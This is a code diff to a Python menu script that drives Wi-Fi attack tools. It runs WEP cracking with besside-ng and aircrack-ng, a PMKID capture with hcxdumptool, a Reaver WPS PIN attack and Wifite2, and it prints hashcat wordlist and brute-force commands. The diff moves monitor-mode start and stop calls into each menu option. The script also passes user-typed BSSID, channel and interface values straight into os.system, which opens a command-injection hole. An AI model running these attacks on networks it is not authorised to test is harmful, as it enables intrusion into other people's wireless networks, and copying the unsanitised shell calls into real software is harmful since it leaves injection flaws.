@@ -3,7 +3,6 @@ from colorama import Fore, Style
 
 
 interface = input(Fore.CYAN + '[*]Enter interface to use: ' + Style.RESET_ALL)
-os.system('airmon-ng start ' + interface)
 
 def wait():
   wait = input('PRESS ENTER TO CONTINUE')
@@ -31,20 +30,26 @@ def main():
   in_put = input(': ')
   if in_put == '1':
     print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
+    os.system('airmon-ng start ' + interface)
     print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
     os.system('airodump-ng ' + interface + 'mon')
+    os.system('airmon-ng stop ' + interface + 'mon') 
     wait()
   if in_put == '2':
     print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
+    os.system('airmon-ng start ' + interface)
     print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
     os.system('wash -i ' + interface + 'mon')
+    os.system('airmon-ng stop ' + interface + 'mon')
     wait()
   if in_put == '3':
     bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
     channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
     print(Fore.CYAN + '[*]Gathering Packets From Network: ' + bssid + '... (Wait Until You Have About 1000 IVs)' + Style.RESET_ALL)
+    os.system('airmon-ng start ' + interface)
     os.system('besside-ng -b ' + bssid + ' -c ' + channel + ' ' + interface + 'mon')
     os.system('aircrack-ng wep.cap')
+    os.system('airmon-ng stop ' + interface + 'mon')
     wait()
   if in_put == '4':
     adapt = input(Fore.CYAN + '[*]Do you have a wifi adapter with packet injection?[y/N]: ' + Style.RESET_ALL)
@@ -52,6 +57,7 @@ def main():
       bssid = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network BSSID: ' + Style.RESET_ALL)
       channel = input(Fore.CYAN + '[*]Enter WPA/WPA2 Network Channel: ' + Style.RESET_ALL)
       print(Fore.CYAN + '[*]Starting PMKID Attack...')
+      os.system('airmon-ng start ' + interface)
       print('[*]Wait about 10 minutes to gather enough packets, use ^C or ^Z to end hcxdumptool...' + Style.RESET_ALL)
       os.system('hcxdumptool -i ' + interface + 'mon -o output.pcapng --enable_status=1')
       print(Fore.CYAN + '[*]Converting output.pcapng to ouputHC.16800 for hashcat bruteforcing...' + Style.RESET_ALL)
@@ -59,6 +65,7 @@ def main():
       print(Fore.GREEN + '[+]File Converted! Use hashcat in these two methods to crack: ' + Style.RESET_ALL)
       print(Fore.CYAN + '  [*]  Wordlist: hashcat -m 16800 outputHC.16800 -a 0 --force wordlist.lst -O')
       print(Fore.CYAN + '  [*]Bruteforce: hashcat -m 16800 outputHC.16800 -a 3 --force ?a?a?a?a?a?a -O')
+      os.system('airmon-ng stop ' + interface + 'mon')
       wait()
     else:
       print(Fore.RED + "[*]You can't attack a WPA/WPA2 encrypted network without packet injection..." + Style.RESET_ALL)
@@ -67,7 +74,9 @@ def main():
     bssid = input(Fore.CYAN + '[*]Enter Network BSSID: ' + Style.RESET_ALL)
     channel = input(Fore.CYAN + '[*]Enter Network Channel: ' + Style.RESET_ALL)
     print(Fore.CYAN + '[*]Running Reaver to attack WPS PIN exploit...' + Style.RESET_ALL)
+    os.system('airmon-ng start ' + interface)
     os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -c ' + channel + '  -vv -Z')
+    os.system('airmon-ng stop ' + interface + 'mon')
     wait()
   if in_put == '6':
     print(Fore.CYAN + '[*]Starting Wifite2...' + Style.RESET_ALL)
